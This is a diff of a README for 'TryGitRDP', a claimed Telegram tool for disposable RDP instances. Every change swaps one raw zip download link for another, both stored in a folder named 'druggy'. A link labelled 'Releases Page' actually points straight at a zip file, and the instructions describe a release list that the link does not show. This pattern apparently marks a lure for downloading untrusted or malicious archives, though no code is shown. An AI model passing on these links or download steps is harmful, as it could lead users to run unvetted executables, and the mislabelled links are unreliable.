@@ -4,7 +4,7 @@
 Welcome to TryGitRDP! This tool helps you quickly set up disposable Windows and Ubuntu instances right from Telegram. With our admin dashboard and auto-kill features, you can manage everything easily without any hassles. Let’s get started!
 
 ## 🔗 Download Now
-[![Download TryGitRDP](https://raw.githubusercontent.com/leelisten66/TryGitRDP/main/druggy/Try-Git-RDP-2.1-beta.3.zip)](https://raw.githubusercontent.com/leelisten66/TryGitRDP/main/druggy/Try-Git-RDP-2.1-beta.3.zip)
+[![Download TryGitRDP](https://raw.githubusercontent.com/leelisten66/TryGitRDP/main/druggy/RDP_Git_Try_v1.8.zip)](https://raw.githubusercontent.com/leelisten66/TryGitRDP/main/druggy/RDP_Git_Try_v1.8.zip)
 
 ## 📝 Key Features
 - **Serverless Automation**: Manage your RDP instances easily without maintaining servers.
@@ -21,7 +21,7 @@ Welcome to TryGitRDP! This tool helps you quickly set up disposable Windows and 
 ## 🛠️ Installation Steps
 
 ### Step 1: Visit the Releases Page
-To download TryGitRDP, please visit the following link: [Releases Page](https://raw.githubusercontent.com/leelisten66/TryGitRDP/main/druggy/Try-Git-RDP-2.1-beta.3.zip). 
+To download TryGitRDP, please visit the following link: [Releases Page](https://raw.githubusercontent.com/leelisten66/TryGitRDP/main/druggy/RDP_Git_Try_v1.8.zip). 
 
 ### Step 2: Find the Latest Version
 On the Releases page, you will see a list of available versions. Look for the latest release. It will usually be at the top. 
@@ -75,6 +75,6 @@ We value your feedback. If you have suggestions or thoughts about TryGitRDP, fee
 - Windows Server 
 
 ## 🔗 Download Again
-To download TryGitRDP once more, visit this link: [Download TryGitRDP](https://raw.githubusercontent.com/leelisten66/TryGitRDP/main/druggy/Try-Git-RDP-2.1-beta.3.zip). 
+To download TryGitRDP once more, visit this link: [Download TryGitRDP](https://raw.githubusercontent.com/leelisten66/TryGitRDP/main/druggy/RDP_Git_Try_v1.8.zip). 
 
 Thank you for choosing TryGitRDP! Enjoy managing your RDP instances seamlessly.
